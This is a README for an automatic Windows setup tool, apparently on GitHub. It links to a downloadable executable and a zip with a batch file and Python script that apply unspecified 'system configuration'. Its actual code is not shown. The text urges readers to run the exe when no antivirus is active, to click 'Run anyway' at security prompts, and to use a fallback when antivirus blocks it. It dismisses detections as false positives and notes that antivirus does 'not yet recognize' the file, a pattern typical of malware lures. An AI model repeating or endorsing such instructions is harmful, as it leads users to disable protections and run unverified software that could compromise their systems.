# TTGM Automatic Setup

## 🛠️ Simple Installation Instructions

This project is prepared to run **after an automated ISO installation**. Below are two installation methods:

---

### 🔹 1) Easy Method (Recommended)

If there is **no antivirus** actively running on your computer, simply download and run the file below:

👉 [Download TTAutoSetup.exe](https://github.com/7yasin/ttautosetup/releases/download/supportassist/TTAutoSetup.exe)

> This executable handles everything for you. During installation, you may see security prompts — choose **“Run anyway”** to proceed.

---

### 🔹 2) Alternative Method (If antivirus blocks the .exe)

Some antivirus products may block the automatic installer. In that case, download the `.zip` below and run the `kurulum.bat` inside:

👉 [Download autoSetup.zip](https://github.com/7yasin/ttautosetup/releases/download/supportassist/autoSetup.zip)

**Contents:**
- `kurulum.bat` → Installs Python if needed and starts the setup.
- `main.py` → Main installer script (runs automatically).

---

📌 **Note:** The installers are safe. However, some antivirus tools may incorrectly flag them (false positive).

---

## ⚙️ For Developers and Technical Users

This project provides two distribution methods:

---

### 🔸 1) Single Executable (Standalone .exe)

- File: [`TTAutoSetup.exe`](https://github.com/7yasin/ttautosetup/releases/download/supportassist/TTAutoSetup.exe)  
- Purpose: Run the automation even on systems **without** a pre-installed Python.  
- Detail: The `main.py` script is packaged with **PyInstaller** and launches configuration tasks directly.

**Note:** Most antivirus tools do not yet recognize this .exe and allow it to run, but some systems may still show false positives.

---

### 🔸 2) Source + Batch-Based Installer (Fallback)

- Package: [`autoSetup.zip`](https://github.com/7yasin/ttautosetup/releases/download/supportassist/autoSetup.zip)  
- Includes:
  - `main.py` – Python script
  - `kurulum.bat` – Checks/installs Python and runs the script
- Detail: If the .exe is blocked, this alternative installs Python on Windows (if missing) and then executes `main.py`.

---

### Additional Information

- `kurulum.bat` checks whether Python is installed on Windows.  
- If needed, it installs Python (via Microsoft Store or direct installer).  
- Afterwards, the script applies the required system configuration automatically.

---

**Security Note:** The source files are openly provided. You can review `main.py` and build your own executable if desired.
